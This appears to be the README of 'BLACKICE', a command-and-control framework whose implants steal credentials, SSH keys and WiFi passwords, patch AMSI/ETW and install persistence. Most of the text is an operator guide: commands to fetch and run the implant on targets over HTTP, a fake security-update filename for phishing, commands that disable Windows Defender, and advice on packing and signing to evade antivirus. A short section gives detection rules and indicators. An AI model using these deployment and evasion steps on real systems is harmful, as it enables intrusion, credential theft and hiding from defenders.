
# BLACKICE - Cross-Platform Red Team Framework

```
    ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗ ██████╗███████╗
    ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║██╔════╝██╔════╝
    ██████╔╝██║     ███████║██║     █████╔╝ ██║██║     █████╗  
    ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║██║     ██╔══╝  
    ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║╚██████╗███████╗
    ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚══════╝
    
    Black Intrusion Countermeasures Electronics
    Advanced Command & Control Framework
```

---

## LEGAL DISCLAIMER

**AUTHORIZED USE ONLY**

This framework performs offensive security operations including credential extraction, defense evasion, persistence mechanisms, and data encryption. Unauthorized use constitutes a federal crime under 18 U.S.C.  § 1030 (Computer Fraud and Abuse Act) with penalties up to 10 years imprisonment and $250,000 in fines.

**REQUIRED AUTHORIZATION:**
- Written permission from all target system owners
- Isolated laboratory environment (virtual machines recommended)
- Valid security research engagement or institutional approval

**BY USING THIS TOOL YOU ACCEPT FULL LEGAL RESPONSIBILITY**

---

## Table of Contents

1. [Overview](#overview)
2. [Architecture](#architecture)
3. [Installation](#installation)
4. [Quick Start](#quick-start)
5. [Payload Generation](#payload-generation)
6. [Network Configuration](#network-configuration)
7. [Features](#features)
8. [Configuration](#configuration)
9. [Detection & Evasion](#detection--evasion)
10. [Troubleshooting](#troubleshooting)

---

## Overview

BLACKICE is a cross-platform Command & Control framework built in Go for offensive security operations.  Designed for red team engagements, purple team exercises, and security research in controlled environments.

### Core Capabilities

**Windows Implant (1800+ lines)**
- LSASS memory dumping (credential extraction)
- Browser credential harvesting (Chrome, Edge, Firefox)
- WiFi password extraction
- AMSI/ETW runtime patching (defense evasion)
- Registry and scheduled task persistence
- File encryption simulation (ransomware testing)
- Hidden execution (no console window)

**Linux Implant (1900+ lines)**
- SSH private key harvesting
- Bash history collection
- Network reconnaissance
- Crontab/bashrc/profile persistence mechanisms
- File timestomping (anti-forensics)
- Background daemon execution
- Environment variable extraction

**C2 Server**
- HTTP-based beacon receiver
- Real-time session monitoring
- Web dashboard interface
- Multi-platform implant support
- Credential aggregation

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                      C2 SERVER (Your Machine)               │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  HTTP Server (Port 8443)                             │  │
│  │  - /beacon      (Implant check-in endpoint)          │  │
│  │  - /sessions    (Web dashboard)                      │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                            ▲
                            │ HTTP POST (JSON)
                            │ Beacon Interval: 60s
                            │
        ┌───────────────────┴───────────────────┐
        │                                       │
┌───────▼─────────┐                   ┌────────▼────────┐
│  WINDOWS TARGET │                   │  LINUX TARGET   │
│  ┌────────────┐ │                   │  ┌────────────┐ │
│  │ Implant.exe│ │                   │  │  payload   │ │
│  └────────────┘ │                   │  └────────────┘ │
│  • Encrypted IP │                   │  • Encrypted IP │
│  • Timestomped  │                   │  • Timestomped  │
│  • Persistence  │                   │  • Persistence  │
└─────────────────┘                   └─────────────────┘
```

### Data Flow

```
[1] INITIAL CHECK-IN
Implant → C2:  {"type":"checkin", "session_id":"...", "hostname":"..."}
C2 Response:    200 OK

[2] RECONNAISSANCE
Implant → C2:  {"type":"recon", "data":{"os":"windows", "kernel":"..."}}

[3] CREDENTIAL HARVESTING
Implant → C2:  {"type":"credentials", "data":{"wifi":[...], "browsers":[...]}}

[4] HEARTBEAT (Every 60s)
Implant → C2:  {"type":"heartbeat", "beacon_count":  42}
```

---

## Installation

### Requirements

**Software**
- Go 1.19 or higher
- Windows 10/11 OR Linux (development machine)
- PowerShell 5.1+ (for build scripts)

**Go Dependencies**
```bash
go get golang.org/x/sys/windows    # Windows API bindings
```

### Setup

```powershell
# Clone or download repository
cd /path/to/BLACKICE

# Verify Go installation
go version

# Build C2 server
cd server
go build -o ..\payloads\server\blackice-server.exe blackice-server.go

# Server binary now at: payloads\server\blackice-server.exe
```

---

## Quick Start

### Localhost Test (Same Machine)

**Terminal 1: Start C2 Server**
```powershell
cd payloads\server
.\blackice-server.exe
```

**Output:**
```
╔════════════════════════════════════════════════════════════════╗
║  BLACKICE C2 SERVER - ONLINE                                   ║
╚════════════════════════════════════════════════════════════════╝

[+] Platform:        windows/amd64
[+] Listening:      0.0.0.0:8443
[+] Local IP:       192.168.1.10
[+] Dashboard:      http://192.168.1.10:8443/sessions

[*] Awaiting implant connections...
```

**Terminal 2: Build & Execute Windows Payload**
```powershell
cd tools
.\build-windows.bat

# Prompt:  C2 Server IP:  127.0.0.1
# Output: payloads\implants\payload.exe

cd ..\payloads\implants
.\payload.exe
```

**Terminal 1 Output:**
```
[+] NEW IMPLANT [WIN]
    ID:        a3f5b8c2d9e1f4a7
    OS:        windows amd64
    Host:      DESKTOP-ABC123
    User:      Administrator
    IP:        127.0.0.1:52341

[RECON] [WIN] a3f5b8c2 | System enumeration complete
[CREDS] [WIN] a3f5b8c2 | WiFi passwords harvested:  3
[BEACON] [WIN] a3f5b8c2 | Count: 1
```

**Terminal 3: Access Dashboard**
```powershell
start http://localhost:8443/sessions
```

Dashboard displays:
- Session ID (truncated)
- OS indicator (WIN/LIN)
- Hostname
- Username
- Last beacon timestamp
- Total beacon count

---

## Payload Generation

### Windows Payload

```powershell
cd tools
.\build-windows.bat
```

**Interactive Prompts:**
```
════════════════════════════════════════════════
  BLACKICE WINDOWS PAYLOAD BUILDER
════════════════════════════════════════════════

C2 Server IP: 192.168.1.10

[+] Building for 192.168.1.10:8443...
    Encrypted! 

════════════════════════════════════════════════
  SUCCESS! 
════════════════════════════════════════════════

File: payloads\implants\payload.exe

Deploy:   Just double-click on target
```

**Build Process:**
1. IP address encrypted using XOR cipher (key: 0xC3)
2. Encrypted value embedded via `-ldflags -X`
3. Binary compiled with stripped symbols (`-s -w`)
4. GUI mode enabled (`-H windowsgui`) - no console window
5. Output:  Single standalone executable

---

### Linux Payload

```powershell
cd tools
.\build-linux.bat
```

**Interactive Prompts:**
```
════════════════════════════════════════════════
  BLACKICE LINUX PAYLOAD BUILDER
════════════════════════════════════════════════

C2 Server IP: 192.168.1.10

[+] Building for 192.168.1.10:8443...
    Encrypted!

════════════════════════════════════════════════
  SUCCESS! 
════════════════════════════════════════════════

File: payloads\implants\payload

Deploy:  chmod +x payload && ./payload
```

**Build Process:**
1. Cross-compilation for linux/amd64
2. IP encryption identical to Windows
3. Binary compiled with stripped symbols
4. Output: ELF64 executable

---

### Deployment

**Option 1: HTTP Server (Recommended)**
```powershell
# Terminal 1: Serve payloads
cd payloads\implants
go run serve.go

# Output: Server running on http://0.0.0.0:8000

# On target (Windows)
curl http://192.168.1.10:8000/payload.exe -o payload.exe
payload.exe

# On target (Linux)
wget http://192.168.1.10:8000/payload
chmod +x payload
./payload
```

**Option 2: USB Drive**
```powershell
# Copy to USB
copy payloads\implants\payload.exe E:\

# On target
E:\payload.exe
```

**Option 3: Phishing Simulation**
```powershell
# Rename to legitimate-looking filename
ren payload.exe "Microsoft_Security_Update_KB5034441.exe"

# Email as attachment (authorized testing only)
```

---

## Network Configuration

### Scenario 1: Same Subnet (LAN)

```
Network:  192.168.1.0/24

Attacker Machine:  192.168.1.10
Target Machine:    192.168.1.50
```

**Configuration:**
```
C2 Server IP:  192.168.1.10
```

**Verification:**
```cmd
# On target
ping 192.168.1.10
curl http://192.168.1.10:8443/
```

---

### Scenario 2: VMware NAT (Isolated Lab)

```
Host Machine:      192.168.1.10 (physical)
VMware Gateway:    192.168.80.1 (virtual adapter)
Guest VM:          192.168.80.128 (NAT network)
```

**Identify Gateway IP:**
```powershell
# On host
ipconfig | findstr "VMware"

# Output: 
Ethernet adapter VMware Network Adapter VMnet8:
   IPv4 Address: 192.168.80.1  ← USE THIS
```

**Configuration:**
```
C2 Server IP: 192.168.80.1  (NOT 192.168.1.10!)
```

**Verification from VM:**
```bash
ping 192.168.80.1
curl http://192.168.80.1:8443/
# Should return:  BLACKICE C2 Server - Online
```

---

### Scenario 3: Bridged Network (Production-like)

```
Router:        192.168.1.1
├── Host:       192.168.1.10
└── VM:        192.168.1.150  (bridged)
```

**VMware Configuration:**
```
VM → Settings → Network Adapter → Bridged
```

**Configuration:**
```
C2 Server IP: 192.168.1.10
```

VM obtains IP from same DHCP pool as host.  Both systems appear as separate devices on network.

---

### Scenario 4: Internet (Authorized Engagements)

```
Attacker (Public):   203.0.113.50
Router NAT:          Port 8443 → 192.168.1.10:8443
Target (Remote):     Any location
```

**Router Configuration:**
```
Port Forwarding Rule:
  External Port:  8443
  Internal IP:    192.168.1.10
  Internal Port:  8443
  Protocol:       TCP
```

**Find Public IP:**
```powershell
curl ifconfig.me
# Output: 203.0.113.50
```

**Configuration:**
```
C2 Server IP: 203.0.113.50
```

**Security Considerations:**
- Implement authentication on C2 server
- Use TLS/HTTPS instead of HTTP
- Monitor all incoming connections
- Use VPS instead of home IP for operational security

---

## Features

### Windows Implant Capabilities

| Feature | Technique | MITRE ATT&CK | Description |
|---------|-----------|--------------|-------------|
| **WiFi Passwords** | `netsh wlan show profiles` | T1552.001 | Extract saved wireless credentials |
| **Browser Credentials** | DPAPI decryption | T1555.003 | Locate Chrome/Edge/Firefox databases |
| **LSASS Dumping** | MiniDumpWriteDump | T1003.001 | Extract credential material from memory |
| **AMSI Bypass** | Memory patching | T1562.001 | Disable Windows Antimalware Scan Interface |
| **ETW Evasion** | Memory patching | T1562.001 | Blind Event Tracing for Windows |
| **Registry Persistence** | Run key modification | T1547.001 | HKCU\Software\Microsoft\Windows\CurrentVersion\Run |
| **Scheduled Task** | schtasks.exe | T1053.005 | Task triggers on user logon |
| **File Encryption** | AES-256-GCM | T1486 | Ransomware simulation with recovery key |
| **Timestomping** | SetFileTime API | T1070.006 | Modify file MACB timestamps |

### Linux Implant Capabilities

| Feature | Technique | MITRE ATT&CK | Description |
|---------|-----------|--------------|-------------|
| **SSH Key Harvesting** | ~/.ssh/ enumeration | T1552.004 | Extract private keys (id_rsa, id_ed25519) |
| **Bash History** | ~/.bash_history | T1552.003 | Collect command history |
| **Crontab Persistence** | @reboot directive | T1053.003 | Survives system reboot |
| **Bashrc Persistence** | ~/.bashrc modification | T1546.004 | Executes on shell initialization |
| **Daemonization** | Fork and detach | T1564.003 | Background execution |
| **Timestomping** | utimes() syscall | T1070.006 | Set file to 2018 timestamp |
| **Network Recon** | ip/ifconfig parsing | T1016 | Interface and IP enumeration |
| **Known Hosts** | ~/.ssh/known_hosts | T1087.001 | Identify lateral movement targets |

### C2 Server Features

- HTTP beacon receiver (port 8443)
- JSON-based protocol
- Session state management
- Web dashboard (auto-refresh)
- Multi-implant support
- Logging to disk (blackice_c2_server.log)

---

## Configuration

### Encryption Scheme

```
Original IP:      192.168.1.10
XOR Key:         0xC3
Encrypted:        f2faf1edf2f5fbedf2f6f3edf2

Embedded in binary via: 
  -ldflags "-X main.ENCRYPTED_C2_SERVER=f2faf1edf2f5fbedf2f6f3edf2"

Runtime decryption: 
  for each byte:  plaintext = encrypted XOR 0xC3
```

**Advantages:**
- No hardcoded IP in strings section
- Basic obfuscation from static analysis
- Single executable deployment (no config file)

**Limitations:**
- Trivial to reverse with known key
- Not suitable against determined adversary
- Use domain fronting or DNS tunneling for production

---

### Build Flags Explained

```bash
GOOS=windows GOARCH=amd64 go build \
  -ldflags "-s -w -H windowsgui \
            -X main.ENCRYPTED_C2_SERVER=...  \
            -X main.ENCRYPTED_C2_PORT=..." \
  -o payload.exe implant.go
```

| Flag | Purpose | Result |
|------|---------|--------|
| `-s` | Strip symbol table | Smaller binary, harder to reverse |
| `-w` | Strip DWARF debug info | Smaller binary, no source mapping |
| `-H windowsgui` | Set Windows subsystem | No console window appears |
| `-X main.VAR=value` | Set string variable | Embed config at compile time |

**Final size:**
- Windows implant: ~6MB (includes all dependencies)
- Linux implant: ~6MB
- C2 server: ~8MB

---

## Detection & Evasion

### How Defenders Detect BLACKICE

**Network Signatures:**
```
Periodic HTTP POST to /beacon endpoint
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Content-Type: application/json
Body contains: "session_id", "beacon_count", "type":"heartbeat"
```

**Suricata Rule:**
```
alert http any any -> any any (
  msg:"BLACKICE C2 Beacon Detected";
  flow:established,to_server;
  content:"POST"; http_method;
  content: "/beacon"; http_uri;
  content:"session_id"; http_client_body;
  content:"application/json"; http_header;
  sid:9000001; rev:1;
)
```

**Host-Based Indicators (Windows):**
- Registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate`
- Scheduled task: `MicrosoftEdgeUpdateCore`
- File location: `%APPDATA%\Microsoft\Windows\svchost.exe`
- File timestamp: 2015-07-29 (Windows 10 release date)
- LSASS access: Event ID 10 (Sysmon)
- Network connection: Event ID 3 (Sysmon) to port 8443

**Host-Based Indicators (Linux):**
- File:  `~/.config/.systemd-daemon`
- File timestamp: 2018-04-26 (Ubuntu 18.04 release)
- Crontab entry: `@reboot /home/user/.config/.systemd-daemon`
- Bashrc modification: Background execution of hidden binary
- Process name: `.systemd-daemon` (leading dot = hidden)

**EDR Detection:**
- Behavioral analysis:  Unusual process accessing LSASS
- Memory scanning:  AMSI/ETW patch detection
- Process hollowing: CreateRemoteThread detection
- Registry monitoring: Run key modification alerts

### Evasion Techniques Implemented

**Anti-Forensics:**
- Timestomping (MACB timestamp modification)
- Legitimate-looking filenames (`svchost.exe`, `.systemd-daemon`)
- Legitimate-looking registry keys (`WindowsSecurityUpdate`)
- Auto-cleanup (removes artifacts after operation)

**Defense Evasion:**
- AMSI patching (bypass Windows Defender script scanning)
- ETW blinding (evade Sysmon/security event logging)
- No console window (invisible execution on Windows)
- Daemonization (detached from parent process on Linux)

**Obfuscation:**
- XOR-encrypted C2 configuration
- Stripped binaries (no symbols/debug info)
- Hardcoded strings minimized

**Operational Security:**
- HTTP (not HTTPS) - intentionally low-profile
- Standard User-Agent string (blend with legitimate traffic)
- 60-second beacon interval (not too frequent)

### Advanced Evasion (Not Implemented - Future Work)

- **Domain Fronting:** Route C2 through CDN (Cloudflare, Azure)
- **DNS Tunneling:** Beacon via DNS queries instead of HTTP
- **Process Injection:** Run from memory, no disk artifacts
- **Syscalls:** Bypass API hooking by calling NTDLL directly
- **Sandbox Detection:** Detect VM/analysis environment and sleep
- **Certificate Pinning:** Validate C2 server certificate
- **Malleable C2:** Customize HTTP beacon format to mimic legitimate traffic

---

## Troubleshooting

### Implant Not Connecting

**Symptoms:** C2 server shows no activity, implant exits silently

**Diagnosis:**
```powershell
# 1. Verify C2 is listening
netstat -an | findstr 8443
# Expected:  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING

# 2. Test HTTP endpoint
curl http://192.168.1.10:8443/
# Expected:  BLACKICE C2 Server - Online

# 3. Check Windows Firewall
netsh advfirewall firewall show rule name=all | findstr 8443
# If no rule, add one:
netsh advfirewall firewall add rule name="BLACKICE" dir=in action=allow protocol=TCP localport=8443
```

**Common Causes:**
- Wrong C2 IP (implant built with 192.168.1.10, but server on 192.168.80.1)
- Firewall blocking port 8443
- Network unreachable (different subnets without routing)
- Antivirus killed the implant process

---

### Windows Defender Blocks Payload

**Symptoms:** `payload.exe` deleted immediately after creation

**Workaround (Lab Only):**
```powershell
# Add exclusion for project folder
Add-MpPreference -ExclusionPath "C:\Projects\BLACKICE"

# Temporarily disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Production Evasion:**
- Obfuscate strings (use encoding instead of plaintext)
- Pack binary (UPX, Themida, custom packer)
- Use syscalls instead of API calls (bypass hooks)
- Add sleep timers (sandbox evasion)
- Sign binary with valid certificate

---

### LSASS Dump Fails

**Error:** `Failed to open LSASS process`

**Cause:** Insufficient privileges

**Solution:**
```powershell
# Run as Administrator
# Right-click → Run as Administrator

# Verify privileges
whoami /priv | findstr SeDebugPrivilege
# Expected: SeDebugPrivilege    Disabled

# If disabled, UAC bypass required (not implemented by default)
```

---

### Linux Payload No Output

**Expected Behavior:** Linux implant daemonizes (runs in background with no output)

**Verification:**
```bash
# Check if process is running
ps aux | grep systemd-daemon

# Expected output:
# user  1234  ...  /home/user/.config/.systemd-daemon

# Check if persistence installed
crontab -l | grep systemd

# Expected output:
# @reboot /home/user/.config/.systemd-daemon >/dev/null 2>&1

# Monitor network connections
sudo netstat -antp | grep 8443
```

---

## MITRE ATT&CK Mapping

```
┌──────────────────────────────────────────────────────────────┐
│  TACTIC                TECHNIQUE                       ID     │
├──────────────────────────────────────────────────────────────┤
│  Reconnaissance        System Information Discovery   T1082   │
│  Credential Access     OS Credential Dumping          T1003   │
│                        Credentials from Password      T1555   │
│                        Unsecured Credentials          T1552   │
│  Defense Evasion       Impair Defenses                T1562   │
│                        Indicator Removal on Host      T1070   │
│                        Hide Artifacts                 T1564   │
│  Persistence           Boot/Logon Autostart Exec      T1547   │
│                        Scheduled Task/Job             T1053   │
│                        Event Triggered Execution      T1546   │
│  Privilege Escalation  Abuse Elevation Control        T1548   │
│  Execution             Process Injection              T1055   │
│  Command & Control     Application Layer Protocol     T1071   │
│                        Encrypted Channel              T1573   │
│  Impact                Data Encrypted for Impact      T1486   │
└──────────────────────────────────────────────────────────────┘
```

---

## Comparison Matrix

| Feature | BLACKICE | Metasploit | Cobalt Strike | Sliver | Empire |
|---------|----------|------------|---------------|--------|--------|
| **Language** | Go | Ruby | Java | Go | Python |
| **License** | Open Source | BSD | Commercial | GPL-3.0 | BSD |
| **Cost** | Free | Free | $3,500/year | Free | Free |
| **Ease of Use** | Simple | Moderate | Advanced | Moderate | Simple |
| **Windows** | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Linux** | ✓ | ✓ | ✓ | ✓ | Limited |
| **Web Dashboard** | Basic | No | Advanced | Advanced | Basic |
| **OPSEC Features** | Basic | Limited | Advanced | Advanced | Moderate |
| **Learning Curve** | Low | Moderate | High | Moderate | Low |
| **Best For** | Education | Exploits | Enterprise | Modern C2 | PowerShell |

---

## Project Structure

```
BLACKICE/
│
├── README.md                              This file
│
├── implants/                              Payload source code
│   ├── windows/
│   │   └── blackice-windows.go            Windows implant (1800 lines)
│   │                                      - LSASS dumping
│   │                                      - AMSI/ETW patching  
│   │                                      - Registry persistence
│   │                                      - WiFi/browser credentials
│   │
│   └── linux/
│       └── blackice-linux-ultimate.go     Linux implant (1900 lines)
│                                          - SSH key harvesting
│                                          - Crontab persistence
│                                          - Daemonization
│                                          - Network recon
│
├── server/
│   └── blackice-server.go                 C2 server (Go)
│                                          - HTTP beacon receiver
│                                          - Web dashboard
│                                          - Session management
│
├── tools/                                 Build automation
│   ├── build-windows.bat                  Windows payload builder
│   ├── build-linux.bat                    Linux payload builder
│   └── encrypt.ps1                        IP encryption helper
│
└── payloads/                              Compiled binaries
    ├── implants/
    │   ├── payload.exe                    Windows implant (generated)
    │   ├── payload                        Linux implant (generated)
    │   └── serve.go                       HTTP file server for deployment
    │
    └── server/
        ├── blackice-server.exe            C2 server executable
        └── blackice_c2_server.log         C2 activity log
```

---

## References

**Offensive Security Frameworks:**
- Cobalt Strike - https://www.cobaltstrike.com/  
- Sliver - https://github.com/BishopFox/sliver  
- Metasploit - https://www.metasploit.com/  
- Empire - https://github.com/EmpireProject/Empire  

**MITRE ATT&CK:**
- Framework - https://attack.mitre.org/  
- C2 Matrix - https://www.thec2matrix.com/  

**Cyberpunk Literature:**
- Neuromancer (William Gibson) - Inspiration for "Black ICE"
- Snow Crash (Neal Stephenson)
- Ghost in the Shell (Masamune Shirow)

**Go Security Resources:**
- Golang for Security Professionals - https://github.com/parsiya/Hacking-with-Go  
- Offensive Go - https://github.com/alexellis/offensive-go  

---

## Acknowledgments

This framework is built for educational purposes to understand offensive security techniques.  Inspired by professional C2 frameworks and cyberpunk fiction where "Black ICE" represents the ultimate defensive countermeasure.

**"In the sprawl, Black ICE kills.  In the lab, it teaches."**

---

**END OF FILE**

```
BLACKICE v1.0
Educational Red Team Framework
Use Responsibly.  Use Legally. Use Wisely. 
```
```
